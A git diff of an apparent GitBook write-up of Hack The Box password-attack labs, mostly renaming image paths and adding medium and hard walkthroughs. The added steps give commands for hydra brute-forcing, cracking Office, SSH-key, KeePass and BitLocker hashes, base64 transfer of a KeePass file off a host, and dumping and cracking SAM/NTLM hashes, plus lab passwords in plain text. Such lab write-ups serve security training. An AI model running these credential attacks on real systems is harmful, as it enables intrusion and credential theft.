@@ -67,13 +67,13 @@ Find the user for the **WinRM** service and crack their password. Then, when you
 
 `evil-winrm -u john -i 10.129.218.11 -p november`
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
 `hydra -L username.list -P password.list ssh://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ssh dennis@10.129.238.248`
 
@@ -85,11 +85,11 @@ Find the user for the **RDP** service and crack their password. Then, when you l
 
 `hydra -L username.list -P password.list rdp://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Reminna to login
 
-<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SMB** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
@@ -109,9 +109,9 @@ Find the user for the **SMB** service and crack their password. Then, when you l
 
 `run`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient -U cassie -L \10.129.238.248`
 
@@ -894,9 +894,9 @@ mike:7777777
 
 `ftp 10.129.189.211`
 
-<figure><img src=".gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `chmod u+x id_rsa`
 
@@ -906,13 +906,13 @@ passphrase: same as password
 
 * we could obtain it with ssh2john -> get hash from rsa -> decrypt hash -> 7777777
 
-<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
 `cat ~/.bash_history`
 
-<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### PW Attacks lab - MEDIUM
 
@@ -920,7 +920,7 @@ passphrase: same as password
 
 `nmap -sVC 10.129.202.221`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * SSH, SMB
 
@@ -940,13 +940,13 @@ METASPLOIT
 
 `run`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient \\\\10.129.202.221\\SHAREDRIVE -U john`
 
-&#x20;![](<.gitbook/assets/image (2) (1) (1) (1).png>)
+&#x20;![](<.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
-`smbclient \\10.129.202.221\SHAREDRIVE -U john%123456 -c 'get Docs.zip'`
+`smbclient \\\\10.129.202.221\\SHAREDRIVE -U john --password 123456 -c 'get Docs.zip'`
 
 `unzip`
 
@@ -960,14 +960,156 @@ john --wordlist=mut\_password.list docs.has
 
 * PW = Destiny2022!
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 unzip&#x20;
 
 open Documentation.docx
 
-* jason:
+* encrypted, we have to decrypt it via john
+  * /usr/share/john/office2john.py Documentation.docx > pass.txt
+  * john pass.txt
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* open the Documentation.docx
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+* jason:C4mNKjAtL2dydsYa6
 
 ssh jason@10.129.202.221
 
 mysql -u jason -p&#x20;
 
+* C4mNKjAtL2dydsYa6
+
+MYSQL
+
+* show databases;
+* use users;
+* show tables;
+* select \* from creds;
+  * dennis:7AUgWWQEiMPdqx
+* exit MySQL & SSH jason
+
+SSH Dennis
+
+* ssh dennis@10.129.202.221
+  * PW obtained from MySQL DB
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+* scp obtained id\_rsa to your machine
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+* /usr/share/john/ssh2john.py id\_rsa > id\_rsa.hash
+* john --wordlist=mut\_password.list PWmedium/id\_rsa.hash
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+ROOT SSH
+
+* ssh root@10.129.202.221 -i id\_rsa
+  * enter obtained Passphrase
+  * cat flag.txt
+
 ### PW Attacks lab - HARD
+
+* `nmap -sVC 10.129.202.222`
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+* result: RDP + SMBv2
+
+CME
+
+* `poetry run crackmapexec -u johanna -p mut_password.list --shares`
+  * we obtained johanna PW
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+* she didn’t have access to the shared drives. Interestingly, we also stumbled upon a directory named `david`. Subsequently, we used `johanna`’s credentials to attempt an RDP session.
+
+RDP
+
+```bash
+xfreerdp /v:10.129.202.222 /u:johanna /p:1231234!
+```
+
+* Documents (folder) - KeePass DB file named logins.kdbx
+  *   transfer it to our host machine
+
+      * PS - Base64 encoding for the transfer
+
+      ```powershell
+      PS C:\Users\johanna> [Convert]::ToBase64String((Get-Content -path "C:\Users\johanna\Documents\Logins.kdbx" -Encoding byte))
+      ```
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+* on our linux system
+  * obtain the encoded file
+    * `echo A9mimmf7S...L0= | base64 -d > Logins.kdbx`
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+* keepass2john to crack logins
+  * `/usr/share/john/keepass2john Logins.kdbx > kdbx.hash`
+  * `john --wordlist=mut%password.list kdbx.hash`
+    * we obtained PW
+* open Keepass w obtained PW to get creds for David
+
+David
+
+* `smbclient -U david \\\\10.129.202.222\\david`
+  * ls
+  * get Backup.vhd
+
+Attack bitlocker vhd file
+
+* `bitlocker2john -i Backup.vhd > backup.hashes`
+* `grep "bitlocker\$0" backup.hashes > backup.hash`
+* `hashcat -m 22100 backup.hash mut%password.list -o backup.cracked`
+  * we obtained backup PW
+
+Open VHD
+
+* `sudo modprobe nbd`
+* `sudo apt install qemu-utils`
+* `sudo qemu-nbd -c /dev/nbd0 Backup.vhd`
+* `sudo cryptsetup bitlkOpen /dev/nbd0p2 /dev/nbd0p2 backup`
+* `sudo mkdir /mnt/mydrive`
+* `sudo mount /dev/mapper/backup /mnt/mydrive`
+  *   we discovered two files - dumps from the Win SAM DB
+
+      * SAM
+      * SYSTEM
+
+
+
+Attack SAM
+
+*
+
+    ```
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+    ```
+* we retrieved NTLM hash for Administrator account
+* hashcat
+  *
+
+      ```
+      sudo hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_password.list
+      ```
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+*   we obtained PW for admin
+
+    * connect via RDP
+
+    <figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+    * flag.txt
